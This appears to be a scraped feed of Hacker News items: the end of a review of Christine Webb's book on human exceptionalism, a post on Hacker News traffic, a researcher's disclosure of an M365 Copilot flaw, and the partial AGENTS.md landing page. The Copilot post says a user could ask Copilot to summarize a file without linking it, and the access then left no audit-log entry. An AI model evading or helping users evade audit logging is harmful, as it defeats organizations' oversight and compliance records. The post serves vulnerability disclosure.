  		<li><a href="" onclick="window.open( 'https://twitter.com/share?url='+document.URL, 'twitter-share-dialog', 'width=626,height=436'); return false;"><span><svg viewBox="0 0 30 30"><path d="M14.578,10.251c0,0-5.816,1.354-12.308-6.259c0,0-2.528,4.991,1.855,8.035c0,0-1.433,0.254-2.613-0.591c0,0-0.507,4.313,4.72,6.004H3.451c0,0,0.759,3.468,5.648,4.229c0,0-2.022,2.706-8.599,2.537c0,0,3.709,2.874,9.358,2.791c0,0,10.453,0.508,15.427-11.334c1.224-2.911,1.096-5.666,1.011-7.019L29.5,5.77L26.296,6.36c0,0,2.192-1.606,2.446-3.129l-3.541,1.438c0,0-2.655-2.411-7.167-1.438C18.034,3.231,13.904,4.077,14.578,10.251z"></path></svg></span></a></li>
  		<li><a href="mailto:?subject=Democracy%20Journal:%20We%E2%80%99re%20Not%20So%20Special&amp;body=https://democracyjournal.org/magazine/78/were-not-so-special/"><span><svg viewBox="0 0 30 30"><path d="M29.5,7.794v14.413c0,0.714-0.582,1.293-1.3,1.293H1.799c-0.715,0-1.299-0.579-1.299-1.293L0.501,7.78"></path><line x1="28.2" y1="23.5" x2="15.097" y2="15.56"></line><line x1="15.097" y1="15.56" x2="1.799" y2="23.5"></line><path d="M29.5,7.794c0-0.714-0.582-1.294-1.3-1.294H1.799C1.083,6.5,0.5,7.08,0.5,7.794l14.597,7.766L29.5,7.794z"></path></svg></span></a></li>
  		<li><span><span><svg viewBox="0 0 30 30"><path d="M24.006,15.794c-0.158,0.06-0.314,0.124-0.477,0.181c-5.059,1.748-11.36,1.695-16.556,0c-0.335-0.109-0.653-0.242-0.979-0.365C3.889,14.813,1.99,13.751,0.5,12.402v10.605v1.083c0,1.434,1.146,2.596,2.559,2.596h2.68h0.019L7.3,23.287H7.275c-0.172-0.237-0.272-0.529-0.272-0.846v-1.467c0-0.791,0.632-1.433,1.412-1.433h13.306c0.777,0,1.41,0.642,1.41,1.433v1.467c0,0.231-0.057,0.561-0.152,0.774l1.481,3.47h0.007h2.475c1.414,0,2.561-1.162,2.561-2.596c0,0,0-1.083,0-1.084V12.402C28.043,13.882,26.139,14.995,24.006,15.794z"></path><path d="M24.006,15.794c2.133-0.799,4.037-1.912,5.495-3.392c0-1.434-1.146-2.597-2.56-2.597h-2.963c0.016,0.091,0.026,0.183,0.026,0.278v2.319L24.006,15.794L24.006,15.794z"></path><path d="M6.018,9.805H3.059c-1.412,0-2.559,1.163-2.559,2.597c1.49,1.35,3.389,2.411,5.495,3.208v-3.208v-2.319c0-0.095,0.012-0.187,0.027-0.278H6.018z"></path><path d="M23.979,9.805c-0.131-0.757-0.776-1.335-1.562-1.335h-0.411l0.001,0.015L8.018,8.487L8.019,8.47H7.584c-0.784,0-1.431,0.578-1.562,1.335c-0.016,0.091-0.027,0.183-0.027,0.278v2.319v3.208c0.325,0.123,0.644,0.256,0.979,0.365c5.195,1.695,11.497,1.748,16.555,0c0.162-0.057,0.318-0.121,0.478-0.181v-3.392v-2.319C24.006,9.988,23.994,9.896,23.979,9.805z"></path><path d="M22.18,21.35l0.799,1.866c0.097-0.215,0.152-0.543,0.152-0.774v-1.467c0-0.791-0.633-1.433-1.41-1.433H8.415c-0.78,0-1.412,0.642-1.412,1.433v1.467c0,0.315,0.101,0.607,0.272,0.846h0.023l0.878-1.938H22.18z"></path><polygon points="24.46,26.686 22.979,23.216 22.18,21.35 8.177,21.35 7.299,23.286 5.757,26.686 4.48,29.5 25.663,29.5 "></polygon><polygon points="21.469,0.5 8.391,0.5 8.019,8.47 22.006,8.47 "></polygon><rect x="8.019" y="8.47" width="13.987" height="0.015"></rect><line x1="25.859" y1="12.131" x2="27.046" y2="12.131"></line></svg></span></span></li>
  		<li><a href="" onclick="javascript:scrollToComments();return false;" id="articletools-comment-link"><span><svg viewBox="0 0 30 30"><path d="M26.474,3.5H3.525C1.855,3.5,0.5,4.817,0.5,6.44v12.988c0,1.624,1.355,2.94,3.025,2.94h15.233l2.882,3.957c0.237,0.232,0.623,0.232,0.859,0l2.884-3.957h1.091c1.672,0,3.026-1.316,3.026-2.94V6.44C29.5,4.817,28.146,3.5,26.474,3.5z"></path><ellipse cx="8.806" cy="13.183" rx="1.966" ry="1.91"></ellipse><ellipse cx="14.966" cy="13.183" rx="1.965" ry="1.91"></ellipse><ellipse cx="20.994" cy="13.183" rx="1.966" ry="1.91"></ellipse></svg></span></a></li>
  	</ul>
  </header>
  
  	<section>
		<img src="https://democracyjourn.wpenginepowered.com/wp-content/uploads/2025/08/shutterstock_1086237623-1400x933.jpg">
		<p>Elephant painting at The Thai Elephant Conservation Center.</p>
	</section>
    
    
  
  <section>
    
<p>Suppose that you are walking at night, and you see someone on your side of the street coming toward you, about to pass you. Is his face angry, or is he just thinking seriously about something?</p>
<p>Your answer to that question may well depend on the faces that you are used to seeing. If you tend to encounter a lot of very angry faces, your threshold for considering a face “angry” is probably high, and so you might well think: He’s thinking seriously about something. But if the faces you encounter are rarely angry, and if you see a lot of friendly people, you might think: He looks pretty angry to me.</p>
<p>The phenomenon I am describing has a name: “prevalence-induced concept change.” It has in fact been demonstrated for judgments about whether faces are angry. When people have seen a lot of very angry faces, they are less likely to perceive arguably angry faces as angry. Prevalence-induced concept change has also been found for ethical judgments: When people see a lot of clearly unethical behavior, they are less likely to characterize arguably unethical behavior as unethical. If, for example, you live in a nation in which corruption is open and rampant, you might not be much agitated when you learn that your neighbors cheat on their taxes.</p>
<p>Prevalence-induced concept change should be seen as a demonstration of the immense power of the normal. What people normally see, or see as normal, establishes the baseline against which they make judgments about both facts and values. That principle helps explain challenges to democracy as well. If a nation is experiencing a significant increase in corruption, or a major deterioration in practices of self-government, its citizens might not be much alarmed today about something that would have been horrifying five years previously.</p>
<p>Christine Webb, a primatologist at New York University, is focused on “the human superiority complex,” the idea that human beings are just better and more deserving than are members of other species, and on the extent to which human beings take themselves as the baseline against which all living creatures are measured. As Hamlet exclaimed: “What a piece of work is man! How noble in reason!… The paragon of animals!” In Webb’s view, human exceptionalism is all around us, and it damages science, the natural environment, democratic choices, and ordinary (human) life. People believe in human superiority even though we are hardly the biggest, the fastest, or the strongest. Eagles see a lot better than we do. Sea sponges live much longer. Dolphins are really good at echolocation; people are generally really bad at it. And yet we keep proclaiming how special we are. As Webb puts it, “Hamlet got one thing right: we’re a piece of work.”</p>
<p><span>W</span>ebb does illuminating academic work on chimpanzees, bonobos, <a href="https://scholar.google.com/citations?view_op=view_citation&amp;hl=en&amp;user=-1ZmyYgAAAAJ&amp;citation_for_view=-1ZmyYgAAAAJ:u5HHmVD_uO8C">capuchin monkeys</a>, and elephants. She studies empathy and consolation in particular. Do chimpanzees, for example, console bereaved mothers? In her new book, <em>The Arrogant Ape</em>, Webb turns to large ethical questions. She gives pride of place to the concept of the “<em>umwelt</em>,” introduced in 1909 by the Estonian-German biologist Jakob von Uexküll, who used the word to capture the world as it is experienced by particular organisms. I have two Labrador Retrievers, Snow and Finley, and on most days, I take them for a walk on a local trail. Every time, it is immediately apparent that they are perceiving and sensing things that are imperceptible to me. They hear things that I don’t; they pause to smell things that I cannot. Their world is not my world. Webb offers a host of more vivid examples, and they seem miraculous, the stuff of science fiction.</p>
<p>For example, hummingbirds can see colors that human beings are not even able to imagine. Elephants have an astonishing sense of smell, which enables them to detect sources of water from miles away. Owls can hear the heartbeat of a mouse from a distance of 25 feet. Because of echolocation, dolphins perceive sound in three dimensions. They know what is on the inside of proximate objects; as they swim toward you, they might be able to sense your internal organs. Pronghorn antelopes can run a marathon in 40 minutes, and their vision is far better than ours. On a clear night, Webb notes, they might be able to see the rings of Saturn. We all know that there are five senses, but it’s more accurate to say that there are five <em>human</em> senses. Sharks can sense electric currents. Sea turtles can perceive the earth’s magnetic field, which helps them to navigate tremendous distances. Some snakes, like pythons, are able to sense thermal radiation. Scientists can give many more examples, and there’s much that they don’t yet know.</p>
<p>Webb marshals these and other findings to show that when we assess other animals, we use human beings as the baseline. Consider the question of self-awareness. Using visual tests, scientists find that human children can recognize themselves in a mirror by the age of three—and that almost no other species can do that. But does that really mean that human beings are uniquely capable of recognizing themselves? It turns out that dogs, who rely more on smell than sight, can indeed recognize themselves, if we test by reference to odor; they can distinguish between their own odor and that of other dogs. (Can you do that?) In this sense, dogs too show self-awareness. Webb argues that the human yardstick is pervasively used to assess the abilities of nonhuman animals. That is biased, she writes, “because each species fulfills a different cognitive niche. There are multiple intelligences!”</p>
<p>Webb contends that many of our tests of the abilities of nonhuman animals are skewed for another reason: We study them under highly artificial conditions, in which they are often miserable, stressed, and suffering. Try caging human beings and seeing how well they perform on cognitive tests. As she puts it, “A laboratory environment can rarely (if ever) adequately simulate the natural circumstances of wild animals in an ecologically meaningful way.” Suppose, for example, that we are investigating “prosociality”—the question of whether nonhuman animals will share food or cooperate with one another. In the laboratory, captive chimpanzees do not appear to do that. But in the wild, chimpanzees behave differently: They share meat and other food (including nuts and honey), and they also share tools. During hunting, chimpanzees are especially willing to cooperate. In natural environments, the differences between human beings and apes are not nearly so stark. Nor is the point limited to apes. Cows, pigs, goats, and even salmon are a lot smarter and happier in the wild than in captive environments.</p>
<p>Webb now limits her own research to sanctuaries and the wild. She is especially focused on animal emotions. As I have noted, one of her central academic interests is whether chimpanzees console one another after the death of a loved one or after conflicts. Consolation is, of course, an indicator of empathy. In one case, Webb found that after an adult chimpanzee gave birth to a stillborn infant, group members followed her closely, groomed her, and hugged her. “They were attempting to reassure her,” Webb writes, “providing the first clear evidence that other animals console bereaved group members.” Return to the idea of the <em>umwelt</em>: Webb believes that we underestimate the emotional and cognitive experience of other species, including those to which we are not closely related, such as birds and crustaceans. Evolution often finds diverse ways to achieve the same ends. Other species might not have exactly the same abilities that we do, but with the abilities they do have, they might be able to do what we do anyway. For example, crustaceans do not have a visual cortex, but they are nonetheless able to see. Why, Webb asks, should we make human beings the measure of all things?</p>
<p><span>I</span>t would be possible to read Webb as demonstrating that nonhuman animals are a lot more like us than we think. But that is not at all her intention. On the contrary, she rejects the argument, identified and also rejected by the philosopher Martha Nussbaum, that the nonhumans animals who are most like us deserve the most protection, what Nussbaum calls the “so like us” approach. (This is also part of the title of an old documentary about Jane Goodall’s work.) Webb sees that argument as a well-meaning but objectionable form of human exceptionalism. Why should it matter that they are like us? Why is that necessary? With Nussbaum, Webb insists that species are “wonderfully different,” and that it is wrong to try to line them up along a unitary scale and to ask how they rank. Use of the human yardstick, embodied in the claim of “so like us,” is a form of blindness that prevents us from seeing the sheer variety of life’s capacities, including cognitive ones. As Nussbaum writes, “Anthropocentrism is a phony sort of arrogance.”</p>
<p>Webb is especially concerned that the commitment to human exceptionalism tends to be invisible; it is an unspoken assumption, a kind of given. Most broadly, she argues for a sense of awe. Awe “seems to keep egotism in check, prompting a reduction in self-focus and making personal concerns and goals appear less significant.” Awe leads in turn to humility, which, she thinks, is an “unsung virtue” that we ought to apply “to how we relate to the rest of the living world.” She thinks that experiencing humility leads to better science and better lives. That is one reason why she likes the idea of “hope,” which she opposes to “optimism.” Optimism is probabilistic; it suggests that with some probability, things will turn out well. Hope, by contrast, “centers on potential and uncertainty,” and it “is more aligned with humility.”</p>
<p>Webb’s vivid and moving book can be read in two different ways. You can read it as a linked set of striking and even dazzling scientific findings about the capacities of nonhuman animals—how they think, what (and how much) they feel, and what they are able to do. The findings are inspiring and potentially life-changing. After reading Webb’s book, it is hard to think of nonhuman animals in the same way. You might love dogs (I certainly do), but if you attend to what Webb has to say, you will appreciate them more and differently, and perhaps show them greater respect. And if you are inclined to evaluate nonhuman animals by reference to the capacities of human beings, Webb will get you to rethink. She demonstrates that if science insists on using the human <em>umwelt</em>, it will deprive itself of a world of knowledge—and that if ordinary people do that, they will have a blinkered understanding of other living beings. It’s as if Webb takes a black-and-white world and reveals that it’s full of colors.</p>
<p>Webb’s book is also a distinctive moral argument for protecting the well-being of nonhuman animals, informed by but not reducible to scientific findings. To get hold of the distinctiveness of that argument, consider what is probably the most famous passage ever written on the topic of animal rights, by the philosopher Jeremy Bentham, founder of utilitarianism:</p>
<p>The day <em>may </em>come, when the rest of the animal creation may acquire those rights which never could have been withholden from them but by the hand of tyranny.… [A] full-grown horse or dog is beyond comparison a more rational, as well as a more conversable animal, than an infant of a day, or a week, or even a month, old. But suppose the case were otherwise, what would it avail? the question is not, Can they reason? nor, Can they talk? but, Can they suffer?</p>
<p>Webb’s book makes that passage seem not at all wrong, but inadequate, thin, and a bit obtuse. To be sure, she enthusiastically agrees that suffering matters, and she offers a great deal of evidence that nonhuman animals can indeed suffer. But when Bentham says that suffering is “the question,” what does he mean, exactly? Why is that the question? In his own way, Bentham (and some though not all of his utilitarian followers) can be taken to be using human beings as the yardstick, with the important notation that with respect to the capacity to suffer, human beings are not exceptional at all. On that count, nonhuman animals are indeed so like us. Webb’s response is essentially this: “The question is not, Can they reason? Nor, can they talk? Nor, can they suffer? Nor, are they similar to us? But, what are they capable of?”</p>
<p>That is a more open-ended question. It is humbler. It does not load any dice. It is also a kind of doorway to a host of further questions. If we ask what nonhuman animals are capable of, we should certainly seek to reduce suffering; but we might also want to promote, and certainly not damage or stifle, a range of other capabilities on their part. After all, a good life for people includes much more than an absence of pain. If a powerful species put in control of our planet focused only on reducing our suffering, we would not think that they understood us at all. You can read Webb as endorsing the capabilities approach that Nussbaum elaborated in her <em>Justice for Animals</em>; Webb doesn’t do so explicitly, but her argument is certainly compatible with that approach. What makes Webb’s account novel and fresh is the sheer wealth of detail that she offers about the capabilities of nonhuman animals, and her use of that detail to support her plea for humility and awe.</p>
<p>Webb is a scientist who thinks that human exceptionalism is unscientific, but she is also a reformer who thinks that human exceptionalism is wrong. She claims that it “is at the root of the ecological crisis.” In her account, scientific experimentation on nonhuman animals is often cruel, and because laboratory conditions are so artificial, its findings are often bogus. She does not think that gorillas, chimpanzees, dogs, and rats should be seen as objects for human use. (If you are deciding whether to become a vegetarian, Webb might make that decision seem really easy.) She also urges that human exceptionalism is not good for people; it is “backfiring on us today, spurring forest fires, sea level rise, mass extinctions, and pandemics like the coronavirus.” In her view, human exceptionalism is a literally dangerous way of seeing things, a product of “brainwashing” that can be found wherever you look.</p>
<p>Webb’s claims about the concrete consequences of human exceptionalism may or may not be right; the causal chains are not simple here. Nor is her remarkable book a policy manual; it operates at a higher level of abstraction than that. But her ultimate goal for arrogant apes, including scientists, is resonant. It is nothing less than a re-enchantment of the world.</p>
    
      </section>


	<section>
		
          <h4>Read more about  <a href="https://democracyjournal.org/tag/animal-welfare/" alt="View all posts in animal welfare">animal welfare</a><a href="https://democracyjournal.org/tag/philosophy/" alt="View all posts in Philosophy">Philosophy</a></h4>
    
		
    	</section>
  
      		<section>
			<p><a href="https://democracyjournal.org/author/csunstein/">Cass R. Sunstein</a> <span>Cass R. Sunstein is the Robert Walmsley University Professor at Harvard University and author, most recently, of <a href="https://mitpress.mit.edu/9780262049771/on-liberalism/"><em>On Liberalism: In Defense of Freedom</em></a>.</span></p>
      			<h2>Also by this author</h2>
              <h2><a href="https://democracyjournal.org/magazine/34/democratizing-regulation-digitally/">Democratizing Regulation, Digitally</a></h2>
      					</section>
		
    
</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The value of hitting the HN front page (169 pts)]]></title>
            <link>https://www.mooreds.com/wordpress/archives/3530</link>
            <guid>44958020</guid>
            <pubDate>Wed, 20 Aug 2025 02:00:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.mooreds.com/wordpress/archives/3530">https://www.mooreds.com/wordpress/archives/3530</a>, See on <a href="https://news.ycombinator.com/item?id=44958020">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="page">
			
			            
			
								
					<article id="post-3530">
 <div>
 		<p>I’ve been a member of Hacker News (HN) since 2012. <a href="https://news.ycombinator.com/user?id=mooreds">You can see my profile here</a>. (Thanks to <a href="https://twitter.com/jeffbeard/">Jeff Beard</a> for introducing me to it so many years ago.)</p>
<p>I currently hover around the upper 30s on the top 100 leader list. <a href="https://redmonk.com/videos/a-redmonk-conversation-engaging-with-developers-on-hacker-news-with-dan-moore/">I’ve talked about that community with the good folks at RedMonk</a>. After submitting thousands of stories, including over 400 with more than 100 points, here are outcomes I expect from a high ranking HN post.</p>
<p><strong>Traffic</strong></p>
<p>The first is the traffic. It’s not uncommon to get thousands of visits from an HN post that hangs out on the front page. Make sure <a href="https://www.mooreds.com/wordpress/archives/2565">you have a CDN at the ready</a>. It is, however, unlikely to convert.</p>
<p>Whether you want people to buy, download, or even sign up for a newsletter, HN traffic isn’t much help. It’s low conversion, brand awareness traffic.</p>
<p>That may be what you need–just standing out among the crowd is tough these days. But don’t think you’ll trend on HN and get a ton of sign ups.</p>
<p><strong>Comments</strong></p>
<p>The second valuable result is the comments. DO NOT SLEEP on these.</p>
<p>You have the attention of a large number of smart people who don’t know you, but are taking the time to share their thoughts. They are giving you precious feedback. Do not ignore it, explain it away, or get hurt by it.</p>
<p>Instead, try to understand why they are commenting the way they are. Engage and ask questions that show you have thought about their comment. The best time to do this is right after they make a comment, but even a day later you’ll get some replies.</p>
<p>You don’t have to slavishly make changes based on comments–I’m not even sure that is possible, given that they will conflict. But you should consider them the same way that you would if someone sent you an email.</p>
<p><strong>Follow-on Traffic</strong></p>
<p>After having a post trend on HN, I’ve seen follow-on smaller bumps in traffic in the weeks after. This comes from someone discovering your post on HN and sharing it. This could be from a newsletter, a FaceBook group, a follow-on blog post, or via another social network. I don’t know if this traffic converts better, but it again adds to the brand awareness of your company or product.</p>
<p>If you can figure out where these came from, either via referrer headers or a Google alert (if the referring site is public) it is also great to reach out to these sources of traffic with other content or advertising.</p>
<p>Since they self-selected and were interested in sharing your post initially, they will likely want to share other things you’ve written.</p>
<p><strong>Gratitude</strong></p>
<p>If you shared a post from someone else, which you should do for the vast majority of your HN posts (~90%), and it hits the front page, you may get a note of thanks. I’ve had both strangers and friends reach out with a quick ‘thank you’ when something I posted from them gets traction. This only works if you have contact info on your profile or they have some other way of getting in touch with you.</p>
<p>There are also results which you should not expect from a high ranking post.</p>
<p><strong>Non-Outcomes</strong></p>
<ul>
<li><a href="https://www.reifyworks.com/writing/2017-03-13-hacker-news-doesnt-pay-the-bills">HN is not a marketing plan</a>. While writing content for HN can be helpful if your target buyer or buyer influencer hangs out there, it won’t lead directly to conversions. It is a piece of the top of the funnel efforts you have, not the totality.</li>
<li>Broad market feedback. Not everyone is on HN. Not every developer is on HN. Not even every developer in SF is on HN. Plan accordingly.</li>
<li>Reliable traffic. HN is very fickle. I’ve had more than one story that I posted fizzle, while the same story posted by someone else one to three days later sails to the front page.</li>
</ul>

		            </div>
</article><!-- #post-3530 -->
				
			
                        	
	
	
		</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Copilot broke audit logs, but Microsoft won't tell customers (667 pts)]]></title>
            <link>https://pistachioapp.com/blog/copilot-broke-your-audit-log</link>
            <guid>44957454</guid>
            <pubDate>Wed, 20 Aug 2025 00:18:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pistachioapp.com/blog/copilot-broke-your-audit-log">https://pistachioapp.com/blog/copilot-broke-your-audit-log</a>, See on <a href="https://news.ycombinator.com/item?id=44957454">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content"><main><header></header><section><p><span>Published on <!-- -->19.08.2025</span><span>8<!-- --> min read</span></p></section><section><article><p>Like most tech companies, Microsoft is going all-in on AI. Their flagship AI product, Copilot (in all its various forms), allows people to utilize AI in their daily work to interact with Microsoft services and generally perform tasks. Unfortunately, this also creates a wide range of new security problems.</p><p>On July 4th, I came across a problem in M365 Copilot: Sometimes it would access a file and return the information, but the audit log would not reflect that. Upon testing further, I discovered that I could simply ask Copilot to behave in that manner, and it would. That made it possible to access a file without leaving a trace. Given the problems that creates, both for security and legal compliance, I immediately reported it to Microsoft through their MSRC portal.</p><p>Helpfully, Microsoft provides <a target="_blank" rel="noreferrer" href="https://msrc.microsoft.com/blog/2023/07/what-to-expect-when-reporting-vulnerabilities-to-microsoft/">a clear guide on what to expect</a> when reporting vulnerabilities to them. Less helpfully, they didn’t follow that guide at all. The entire process has been a mess. And while they did fix the issue, classifying this issue as an ‘important’ vulnerability, they also decided not to notify customers or publicize that this happened. What that means is that your audit log is wrong, and Microsoft doesn’t plan on telling you that.</p><p>This post is split into three parts. The first part explains the Copilot vulnerability and the problems it can cause. The second part outlines how Microsoft handled the case. And the third part discusses Microsoft’s decision not to publish this information, and why I consider that to be a huge disservice to Microsoft’s customers.</p><h2 id="the-vulnerability-copilot-and-audit-logging">The Vulnerability: Copilot and Audit Logging</h2><p>The vulnerability here is extremely simple. Normally, if you ask M365 Copilot to summarize a file for you, it will give you a summary and the audit log will show that Copilot accessed that file on your behalf.<a id="note-1" href="https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-1" data-discover="true">[<!-- -->1<!-- -->]</a></p><p><img src="https://pistachioapp.com/bucket/images/website/blog/posts/copilot-broke-your-audit-log/expected-behavior-request.png" alt="Expected behavior request"></p><p><img src="https://pistachioapp.com/bucket/images/website/blog/posts/copilot-broke-your-audit-log/expected-behavior-log.png" alt="Expected behavior log"></p><p>That’s good. Audit logs are important. Imagine someone downloaded a bunch of files before leaving your company to start a competitor; you’d want some record of that, and it would be bad if the person could use Copilot to go undetected.<a id="note-2" href="https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-2" data-discover="true">[<!-- -->2<!-- -->]</a> Or maybe your company has sensitive personal data, and you need a strict log of who accessed those files for legal and compliance purposes; again, you’d need to know about access that occurred via Copilot. That’s just two examples. Organizations rely on having an accurate audit log.</p><p>But what happens if you ask Copilot to not provide you with a link to the file it summarized? Well, in that case, the audit log is empty.</p><p><img src="https://pistachioapp.com/bucket/images/website/blog/posts/copilot-broke-your-audit-log/bad-behavior-request.png" alt="Bad behavior request"></p><p><img src="https://pistachioapp.com/bucket/images/website/blog/posts/copilot-broke-your-audit-log/bad-behavior-log.png" alt="Bad behavior log"></p><p>Just like that, your audit log is wrong. For a malicious insider, avoiding detection is as simple as asking Copilot.<a id="note-3" href="https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-3" data-discover="true">[<!-- -->3<!-- -->]</a></p><p>You might be thinking, “Yikes, but I guess not too many people figured that out, so it’s probably fine.” Unfortunately, you’d be wrong. When I found this, I wasn’t searching for ways to break the audit log. Instead, I was simply trying to trigger the audit log so I could test functionality we are developing at Pistachio, and I noticed it was unreliable. In other words, this can happen by chance.<a id="note-4" href="https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-4" data-discover="true">[<!-- -->4<!-- -->]</a> So if your organization has M365 Copilot licenses, your audit log is probably wrong.</p><h2 id="problems-with-msrc">Problems with MSRC</h2><p>I had never reported a vulnerability to Microsoft before, and my initial reaction to the process was fairly positive. The fact that I could submit something already felt unusually friendly by Microsoft’s standards. And like I mentioned, they even had a guide on what to expect.</p><p>Unfortunately, nothing went according to plan. On July 7th my report’s status was changed to “reproducing”, but when I went to provide more evidence on July 10th the functionality had changed. That isn’t Microsoft’s policy; they’re meant to reproduce, then move to “develop” when they start working on a fix. Seeing the functionality change while still in “reproducing” made me think Microsoft was going to get back to me and claim they couldn’t reproduce the issue, when actually they had simply fixed it based on my report.</p><p>So I asked MSRC what was happening, and instead of responding with a simple explanation, they changed the status of the report to “develop” and said nothing. Up until that point I thought Microsoft was going to follow a process, and coordinate with me if they had to deviate from that. Instead, it felt like the process was less a reflection of what was really happening, and more akin to the Domino’s Pizza Tracker for security researchers. The statuses aren’t real.</p><p>On August 2nd, Microsoft informed me that a full fix would be released on August 17th, that I would be free to disclose as of August 18th. I then asked when a CVE number would be issued, and I was told:</p><blockquote><p>CVEs are given to fixes deployed in security releases when customers need to take action to stay protected. In this case, the mitigation will be automatically pushed to Copilot, where users do not need to manually update the product and a CVE will not be assigned.</p></blockquote><p>That is not Microsoft’s policy at all, which I pointed out to them by <a target="_blank" rel="noreferrer" href="https://msrc.microsoft.com/blog/2024/06/toward-greater-transparency-unveiling-cloud-service-cves/">linking to their own policy</a>. MSRC then wrote back, “I understand you may not have full visibility into how MSRC approaches these cases”, as if I was the wrong one. They then explained that the vulnerability is classified as “important”, not “critical”, and that is why they will not issue a CVE.<a id="note-5" href="https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-5" data-discover="true">[<!-- -->5<!-- -->]</a> Of course, they had not told me that they had classified the vulnerability at all prior to that point.</p><h2 id="microsofts-decision-to-say-nothing">Microsoft’s Decision to Say Nothing</h2><p>If Microsoft isn’t issuing a CVE for this vulnerability, how are they going to inform customers about it? The answer is that they’re not going to. On a call on August 14th, Microsoft told me that they had no plans to disclose this.<a id="note-6" href="https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-6" data-discover="true">[<!-- -->6<!-- -->]</a></p><p>I strongly feel that is wrong. It might be okay to move on silently if this was some esoteric exploit, but the reality is that it is so easy that it basically happens by accident. If you work at an organization that used Copilot prior to August 18th, there is a very real chance that your audit log is incomplete.</p><p>Do organizations not need to know that? What about companies that are subject to HIPAA and are relying on Microsoft’s audit log to satisfy some of the <a target="_blank" rel="noreferrer" href="https://www.law.cornell.edu/cfr/text/45/164.312">technical safeguard requirements</a>? Do they not get to know, despite Microsoft claiming M365 Copilot can be <a target="_blank" rel="noreferrer" href="https://learn.microsoft.com/en-us/copilot/microsoft-365/enterprise-data-protection">HIPAA compliant</a>? There are almost certainly other regulated entities with similar requirements, and they also won’t be told.</p><p>There are so many cases in which organizations rely on audit logs to detect, investigate, and respond to incidents. There are lawsuits where audit logs are used as important evidence. The US government even made an <a target="_blank" rel="noreferrer" href="https://www.cisa.gov/news-events/news/when-tech-vendors-make-important-logging-info-available-free-everyone-wins">issue out of Microsoft charging more for audit logs</a>, with a US senator <a target="_blank" rel="noreferrer" href="https://www.cybersecuritydive.com/news/microsoft-free-security-logs-Outlook-email-hack-backlash/688388/">shaming Microsoft</a> and referring to audit logging as an essential security feature.</p><p>And now Microsoft is saying that even though the audit log was very plausibly wrong for any customer using Copilot, no one needs to know? This raises serious questions about what other problems Microsoft chooses to silently sweep under the rug.</p></article></section><div><p><img src="https://pistachioapp.com/bucket/images/authors/zack-korman-v2.png" alt="Zack Korman"></p><div><p><span>Who wrote this?</span></p><p id="author-description">Zack Korman is the CTO at Pistachio. He writes about product and tech development, as well as his experience in the cybersecurity space. Prior to joining Pistachio he was the Director of Tech and Product at a large media company in Norway.</p></div></div></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AGENTS.md – Open format for guiding coding agents (679 pts)]]></title>
            <link>https://agents.md/</link>
            <guid>44957443</guid>
            <pubDate>Wed, 20 Aug 2025 00:15:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://agents.md/">https://agents.md/</a>, See on <a href="https://news.ycombinator.com/item?id=44957443">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="__next"><main><header><div><div><p>A simple, open format for guiding coding agents,<br>used by over<!-- --> <a href="https://github.com/search?q=path%3AAGENTS.md&amp;type=code" target="_blank" rel="noopener noreferrer">20k open-source projects</a>.</p><p>Think of AGENTS.md as a <strong>README for agents</strong>: a dedicated, predictable place to provide the context and instructions to help AI coding agents work on your project.</p></div><div><pre><code><p># AGENTS.md</p><p>## Setup commands</p><p>- Install deps: <span>`pnpm install`</span></p><p>- Start dev server: <span>`pnpm dev`</span></p><p>- Run tests: <span>`pnpm test`</span></p><p>## Code style</p><p>- TypeScript strict mode</p><p>- Single quotes, no semicolons</p><p>- Use functional patterns where possible</p></code></pre></div></div></header><div id="why"><h2>Why AGENTS.md?</h2><div><p>README.md files are for humans: quick starts, project descriptions, and contribution guidelines.</p><p>AGENTS.md complements this by containing the extra, sometimes detailed context coding agents need: build steps, tests, and conventions that might clutter a README or aren’t relevant to human contributors.</p><p>We intentionally kept it separate to:</p><div><div><p><span>Give agents a clear, predictable place for instructions.</span></p></div><div><p><span>Keep READMEs concise and focused on human contributors.</span></p></div><div><p><span>Provide precise, agent-focused guidance that complements existing README and docs.</span></p></div></div><p>Rather than introducing another proprietary file, we chose a name and format that could work for anyone. If you’re building or using coding agents and find this helpful, feel free to adopt it.</p></div></div><div id="compatibility"><h2>One AGENTS.md works across many agents</h2><div><p>Your agent definitions are compatible with a growing ecosystem of AI coding agents and tools:</p></div></div><div id="examples"><h2>Examples</h2><div><pre><code><p># Sample AGENTS.md file</p><p>## Dev environment tips</p><p>- Use <span>`pnpm dlx turbo run where &lt;project_name&gt;`</span> to jump to a package instead of scanning with <span>`ls`</span>.</p><p>- Run <span>`pnpm install --filter &lt;project_name&gt;`</span> to add the package to your workspace so Vite, ESLint, and TypeScript can see it.</p><p>- Use <span>`pnpm create vite@latest &lt;project_name&gt; -- --template react-ts`</span> to spin up a new React + Vite package with TypeScript checks ready.</p><p>- Check the name field inside each package's package.json to confirm the right name—skip the top-level one.</p><p>## Testing instructions</p><p>- Find the CI plan in the .github/workflows folder.</p><p>- Run <span>`pnpm turbo run test --filter &lt;project_name&gt;`</span> to run every check defined for that package.</p><p>- From the package root you can just call <span>`pnpm test`</span>. The commit should pass all tests before you merge.</p><p>- To focus on one step, add the Vitest pattern: <span>`pnpm vitest run -t "&lt;test name&gt;"`</span>.</p><p>- Fix any test or type errors until the whole suite is green.</p><p>- After moving files or changing imports, run <span>`pnpm lint --filter &lt;project_name&gt;`</span> to be sure ESLint and TypeScript rules still pass.</p><p>- Add or update tests for the code you change, even if nobody asked.</p><p>## PR instructions</p><p>- Title format: [&lt;project_name&gt;] &lt;Title&gt;</p><p>- Always run <span>`pnpm lint`</span> and <span>`pnpm test`</span> before committing.</p></code></pre></div></div><div><h2>How to use AGENTS.md?</h2><div><div><h3>1<!-- -->. <!-- -->Add AGENTS.md</h3><p>Create an 